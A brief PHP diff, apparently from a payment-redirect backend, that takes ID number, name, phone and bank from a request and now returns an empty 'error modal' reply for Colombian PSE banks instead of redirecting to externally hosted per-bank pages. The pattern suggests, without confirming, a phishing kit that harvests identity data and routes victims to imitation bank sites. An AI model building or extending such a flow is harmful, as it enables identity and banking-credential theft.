@@ -9,16 +9,9 @@ $cedula    = trim($_GET['cedula']    ?? '');
 $nombre    = trim($_GET['nombre']    ?? '');
 $telefono  = trim($_GET['telefono']  ?? '');
 
-// Bancos → modal de error
-if ($banco === 'nequi') {
-    echo json_encode([]);
-    exit;
-}
-
-// Bancos con vercel
+// Bancos con vercel → modal de error
 if (isset($PSE_BANKS[$banco])) {
-    $b = $PSE_BANKS[$banco];
-    echo json_encode(['url' => PSE_BASE . '/sites/' . $b['slug'] . '/manager/' . $b['id'], 'delay' => 2000]);
+    echo json_encode([]);
     exit;
 }
 
